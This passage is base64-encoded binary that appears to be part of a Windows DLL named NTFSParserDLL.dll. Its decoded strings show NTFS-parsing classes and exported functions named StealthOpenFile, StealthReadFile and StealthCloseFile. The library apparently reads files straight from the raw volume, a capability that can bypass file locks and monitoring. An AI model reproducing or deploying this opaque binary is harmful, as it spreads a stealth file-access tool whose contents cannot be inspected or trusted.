AAAAsTgEQxIEBEAAAAAAAAAAA/////wAAAABAAAAAPE4BEOiBARAAAAAAAAAAAP////8AAAAAQAAAAExOARAEggEQAAAAAAAAAAD/////AAAAAEAAAABcTgEQOIIBEAEAAAAAAAAA/////wAAAABAAAAAfE4BECCCARAAAAAAAAAAAP////8AAAAAQAAAAGxOARBUggEQAAAAAAAAAAD/////AAAAAEAAAACMTgEQAAAAAAAAAAADAAAADEkBEAAAAAAAAAAAAwAAABxJARAAAAAAAAAAAAMAAAAsSQEQAAAAAAAAAAADAAAAPEkBEAAAAAAAAAAAAwAAAExJARAAAAAAAAAAAAMAAABcSQEQAAAAAAAAAAABAAAAbEkBEAAAAAAAAAAAAwAAAHRJARAAAAAAAQAAAAQAAACESQEQAAAAAAAAAAACAAAAmEkBEAAAAAAAAAAAAwAAAKRJARAAAAAAAAAAAAMAAAC0SQEQAAAAAAEAAAAEAAAAxEkBEAAAAAAAAAAAAwAAANhJARAAAAAAAAAAAAIAAADoSQEQAAAAAAAAAAACAAAA9EkBEAAAAAAAAAAAAQAAAABKARAAAAAAAAAAAAEAAAAISgEQAAAAAAAAAAABAAAAEEoBEAAAAAAAAAAAAQAAABhKARAAAAAAAAAAAAEAAAAgSgEQAAAAAAAAAAABAAAANEoBEAAAAAAAAAAAAgAAAChKARAAAAAAAAAAAAEAAAA8SgEQAAAAAAAAAAAAAAAAGH8BEBxNARAAAAAAAAAAAAAAAABIfwEQLE0BEAAAAAAAAAAAAAAAAHx/ARA8TQEQAAAAAAAAAAAAAAAAqH8BEExNARAAAAAAAAAAAAAAAADYfwEQXE0BEAAAAAAAAAAAAAAAAAiAARBsTQEQAAAAAAAAAAAAAAAAPIABEHxNARAAAAAAAAAAAAAAAABkgAEQjE0BEAAAAAAoAAAAAAAAAISAARCcTQEQAAAAAAAAAAAAAAAAhIABEJxNARAAAAAAAAAAAAAAAACkgAEQrE0BEAAAAAAAAAAAAAAAAMCAARC8TQEQAAAAAAAAAAAAAAAA3IABEMxNARAAAAAAKAAAAAAAAAD4gAEQ3E0BEAAAAAAAAAAAAAAAAPiAARDcTQEQAAAAAAAAAAAAAAAAIIIBEGxOARAAAAAAAAAAAAAAAAAYgQEQ7E0BEAAAAAAAAAAAAAAAADSBARD8TQEQAAAAAAAAAAAAAAAAVIEBEAxOARAAAAAAAAAAAAAAAABwgQEQHE4BEAAAAAAAAAAAAAAAAJiBARAsTgEQAAAAAAAAAAAAAAAAxIEBEDxOARAAAAAAAAAAAAAAAADogQEQTE4BEAAAAAAAAAAAAAAAAASCARBcTgEQAAAAAAAAAAAAAAAAOIIBEHxOARAAAAAAAAAAAAAAAABUggEQjE4BEAAAAAAAAAAAAAAAAExqAAB9agAA8HUAALC8AADw2gAAUOYAAHDmAACu5gAA/uYAADjnAABo5wAAo+cAANPnAAAD6AAAKOgAAH/oAAC46AAA6OgAACbpAAC+6QAA6+kAACPqAABL6gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeE8AEAAAAAAwUQEQAgAAADxRARBYUQEQAAAAAABwARAAAAAA/////wAAAAAMAAAADE8AEAAAAAAccAEQAAAAAP////8AAAAADAAAAG9uABAAAAAAOHABEAAAAAD/////AAAAAAwAAABCTwAQAAAAAINPABAAAAAAoFEBEAMAAACwUQEQdFEBEFhRARAAAAAAWHABEAAAAAD/////AAAAAAwAAAAnTwAQAAAAAINPABAAAAAA3FEBEAMAAADsUQEQdFEBEFhRARAAAAAAeHABEAAAAAD/////AAAAAAwAAABdTwAQ/v///wAAAADU////AAAAAP7///8AAAAAKlcAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAAC+XAAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAC1dABAAAAAA/v///wAAAADM////AAAAAP7///9sXQAQlV0AEAAAAAD+////AAAAANj///8AAAAA/v///wAAAADsYAAQAAAAAP7///8AAAAA1P///wAAAAD+////hGIAEJ5iABAAAAAA/v///wAAAADE////AAAAAP7///8AAAAAX3QAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAABEewAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAAd/ABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAsoIAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAAAzhAAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAAGIABD+////AAAAAA2IABD+////AAAAANj///8AAAAA/v///wAAAABxiQAQ/v///wAAAACAiQAQ/v///wAAAADY////AAAAAP7///+ijQAQpo0AEAAAAAD+////AAAAANj///8AAAAA/v///26NABByjQAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAANKOABAAAAAA/v///wAAAAB8////AAAAAP7///8AAAAA86IAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAABFtAAQAAAAAAq0ABAUtAAQ/v///wAAAACw////AAAAAP7///8AAAAAO6oAEAAAAACHqQAQkakAEP7///8AAAAA2P///wAAAAD+////qbEAEK2xABAAAAAA/v///wAAAADY////AAAAAP7///98qAAQhagAEEAAAAAAAAAAAAAAAOiqABD/////AAAAAP////8AAAAAAAAAAAAAAAABAAAAAQAAAMRUARAiBZMZAgAAANRUARABAAAA5FQBEAAAAAAAAAAAAAAAAAEAAAAAAAAA/v///wAAAADU////AAAAAP7///8nswAQK7MAEAAAAADCqAAQAAAAAExVARACAAAAWFUBEFhRARAAAAAA8HkBEAAAAAD/////AAAAAAwAAACnqAAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAABm3ABAAAAAA/v///wAAAADY////AAAAAP7///9JuAAQXLgAEAAAAAD+////AAAAALz///8AAAAA/v///wAAAAB4ugAQAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAFfOABAAAAAA/v///wAAAADI////AAAAAP7///8AAAAAedcAEAAAAAD+////AAAAAMz///8AAAAA/v///wAAAACn3QAQAAAAAAAAAABx3QAQ/v///wAAAADQ////AAAAAP7///8AAAAARd8AEAAAAAD+////AAAAANj///8AAAAA/v///wAAAADR3wAQAAAAAP7///8AAAAAzP///wAAAAD+////AAAAACrjABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAJuQAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAAA/5QAQIgWTGQQAAAAAVwEQAgAAACBXARAAAAAAAAAAAAAAAAABAAAA/////wAAAAD/////AAAAAAEAAAAAAAAAAQAAAAAAAAACAAAAAgAAAAMAAAABAAAASFcBEAAAAAAAAAAAAwAAAAEAAABYVwEQQAAAAAAAAAAAAAAAMhYAEEAAAAAAAAAAAAAAAPUVABAiBZMZAQAAAIxXARAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////4OgAECIFkxkBAAAAuFcBEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP////+w6AAQIgWTGQEAAADkVwEQAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA/////2DnABAiBZMZAQAAABBYARAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////MOcAECIFkxkDAAAAPFgBEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP/////g5gAQAAAAAOjmABABAAAA8+YAECIFkxkDAAAAeFgBEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP////+Q5gAQAAAAAJjmABABAAAAo+YAECIFkxkDAAAAtFgBEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP////9Q6AAQ/////1voABAAAAAAcegAECIFkxkBAAAA8FgBEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP////9A6gAQIgWTGQoAAAAgWQEQAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAP////9Q6QAQ/////1vpABD/////ZukAEP////9x6QAQ/////3zpABD/////h+kAEP////+S6QAQ/////53pABD/////qOkAEP////+z6QAQIgWTGQEAAACUWQEQAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA/////xDpABAiBZMZAQAAAMBZARAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////4OkAECIFkxkCAAAA7FkBEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP////8Q6gAQAAAAABvqABAiBZMZAgAAACBaARAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////8OcAEAAAAAD45wAQIgWTGQEAAABUWgEQAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA/////yDoABAiBZMZAgAAAIBaARAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////wOcAEAAAAADI5wAQIgWTGQIAAAC0WgEQAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA/////5DnABAAAAAAmOcAEOxaAQAAAAAAAAAAAHJcAQAA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAD8WwEAElwBACRcAQA0XAEAQFwBAFZcAQBkXAEAgFwBAJBcAQCgXAEAtFwBANBcAQDiXAEA+FwBAApdAQAWXQEALl0BADxdAQBSXQEAZF0BAHBdAQB4XQEAiF0BAJRdAQCqXQEAtl0BAMJdAQDaXQEA7F0BAPZdAQACXgEADl4BACBeAQAwXgEATF4BAGpeAQCSXgEApl4BALpeAQDGXgEA1F4BAOJeAQDsXgEA/l4BABJfAQAkXwEAMl8BAEpfAQBgXwEAel8BAJBfAQCqXwEAxF8BAN5fAQD2XwEADmABACBgAQAuYAEARGABAFRgAQBkYAEAdGABAIZgAQCaYAEAqmABALpgAQDOYAEAAAAAABEFV2lkZUNoYXJUb011bHRpQnl0ZQBmBFNldEZpbGVQb2ludGVyAAACAkdldExhc3RFcnJvcgAAwANSZWFkRmlsZQAAZwNNdWx0aUJ5dGVUb1dpZGVDaGFyAFIAQ2xvc2VIYW5kbGUAiABDcmVhdGVGaWxlQQBLRVJORUwzMi5kbGwAAOoARW5jb2RlUG9pbnRlcgDKAERlY29kZVBvaW50ZXIAAANJc0RlYnVnZ2VyUHJlc2VudAAEA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAhgFHZXRDb21tYW5kTGluZUEAxQFHZXRDdXJyZW50VGhyZWFkSWQAALEDUmFpc2VFeGNlcHRpb24AABgEUnRsVW53aW5kAOsCSW50ZXJsb2NrZWREZWNyZW1lbnQAABkBRXhpdFByb2Nlc3MAFwJHZXRNb2R1bGVIYW5kbGVFeFcAAEUCR2V0UHJvY0FkZHJlc3MAANQCSGVhcFNpemUAALIEU2xlZXAAZAJHZXRTdGRIYW5kbGUAACUFV3JpdGVGaWxlABQCR2V0TW9kdWxlRmlsZU5hbWVXAADPAkhlYXBGcmVlAADLAkhlYXBBbGxvYwDvAkludGVybG9ja2VkSW5jcmVtZW50AAAKA0lzVmFsaWRDb2RlUGFnZQBoAUdldEFDUAAANwJHZXRPRU1DUAAAcgFHZXRDUEluZm8AaQJHZXRTdHJpbmdUeXBlVwAAcwRTZXRMYXN0RXJyb3IAANMEVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAAClBFNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgDjAkluaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQAwAFHZXRDdXJyZW50UHJvY2VzcwDABFRlcm1pbmF0ZVByb2Nlc3MAAMUEVGxzQWxsb2MAAMcEVGxzR2V0VmFsdWUAyARUbHNTZXRWYWx1ZQDGBFRsc0ZyZWUAYwJHZXRTdGFydHVwSW5mb1cAGAJHZXRNb2R1bGVIYW5kbGVXAABKAkdldFByb2Nlc3NIZWFwAADzAUdldEZpbGVUeXBlANEARGVsZXRlQ3JpdGljYWxTZWN0aW9uABMCR2V0TW9kdWxlRmlsZU5hbWVBAACnA1F1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAMEBR2V0Q3VycmVudFByb2Nlc3NJZAB5AkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lANoBR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAAYQFGcmVlRW52aXJvbm1lbnRTdHJpbmdzVwDuAEVudGVyQ3JpdGljYWxTZWN0aW9uAAA5A0xlYXZlQ3JpdGljYWxTZWN0aW9uAAA+A0xvYWRMaWJyYXJ5RXhXAADSAkhlYXBSZUFsbG9jAIoDT3V0cHV0RGVidWdTdHJpbmdXAAA/A0xvYWRMaWJyYXJ5VwAALQNMQ01hcFN0cmluZ1cAAJoBR2V0Q29uc29sZUNQAACsAUdldENvbnNvbGVNb2RlAABnBFNldEZpbGVQb2ludGVyRXgAAIcEU2V0U3RkSGFuZGxlAAAkBVdyaXRlQ29uc29sZVcAVwFGbHVzaEZpbGVCdWZmZXJzAACPAENyZWF0ZUZpbGVXAAAAAAAAAAAA0BUUUgAAAAAmYQEAAQAAAAMAAAADAAAACGEBABRhAQAgYQEAQEIAAIA+AACAQQAAOGEBAElhAQBZYQEAAAABAAIATlRGU1BhcnNlckRMTC5kbGwAU3RlYWx0aENsb3NlRmlsZQBTdGVhbHRoT3BlbkZpbGUAU3RlYWx0aFJlYWRGaWxlAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAABAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABbcABAW3AAQFtwAEBbcABAW3AAQFtwAEBbcABAW3AAQFtwAEBbcABAAAAAAAAAAAGh7ARAuAAAAZHsBEDyQARA8kAEQPJABEDyQARA8kAEQPJABEDyQARA8kAEQPJABEH9/f39/f39/uHsBEECQARBAkAEQQJABEECQARBAkAEQQJABEECQARAuAAAAAAAAAIg7ARCKPQEQgJABEAAAAACAkAEQAQEAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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lbWJseSB4bWxucz0ndXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEnIG1hbmlmZXN0VmVyc2lvbj0nMS4wJz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgICAgICA8cmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbGV2ZWw9J2FzSW52b2tlcicgdWlBY2Nlc3M9J2ZhbHNlJyAvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAFgAAAAMMLEw3TAxMWgxkTG9MSwyODJ9M5M0nTSnNFA1ZjV4NRA27DYSNyg3YTcmODc4VDiNOJQ4/DgWOSU5STljOW455zv1OxM8eD+uP8w/6z8AAAAgAACUAAAAJTDKMMoxxjLVMvIyJDNGM28zdTOoM68zyTPoMx40PDRWNGU0gjS0NOU0MTVrNYU1pjW0Nec1JjY0NnE2LDdHN3g3izerN8A35jf1NxI4RDhkOI04lDjGONQ47jj0OAE5EDlGOVg5vzloOgY7GDvFPMo82jxGPVQ9az2MPdY95D37PRw+Bj8WPz4/RT8AMAAAUAAAALwwjDKQMpQymDKcMqAypDKoMqwysDIQNB40SDQ2NUg1xTUrNgc3qjgrObY6yDrmOnc7oTvbPOc8Gj0+PWk9kT22PV4+ij4AAABAAACEAAAAZzHCMvIyYjPSM+Iz+DMuNEY0aDSYNMg0+DSWNaU12zXiNSY4NThYOJA4rzi2OOY69jojO+Y79TsSPEQ8Yzz2PAU9HD0sPTo9VD1jPZY9pD27Pcs92j0LPiI+PD5LPns+kj69PsM+5z7tPhw/Nz9SP20/ej+QP94/6D/zPwBQAAAUAQAAFjAhMEQwTzBkMKMwyzDZMIUyozK8MsMyyzLQMtQy2DIBMyczRTNMM1AzVDNYM1wzYDNkM2gzsjO4M7wzwDPEMyo0NTRQNFc0XDRgNGQ0hTSvNOE06DTsNPA09DT4NPw0ADUENU41VDVYNVw1YDXVNto23zb2Njs3QjdKN7o3vzfIN9Q32TcAOAY4MDioOLI4vTg7OUI5VzlhOWc6bjqBOrk6vzrFOss60TrXOt465TrsOvM6+joBOwg7EDsYOyA7LDs1Ozo7QDtKO1Q7ZDt0O4Q7jTu+O8Q7yjvQO9Y73DvjO+o78Tv4O/87BjwNPBU8HTwlPDA8NTw7PEU8TzxiPGc8dTzdPEw9Aj4NPgBgAADAAAAAEDBIME0wVzCLMKAwqjC0MPUwCzE0MU8xpTG6MdQxNzJlMgMzKzM5M+U0AzUcNSM1KzUwNTQ1O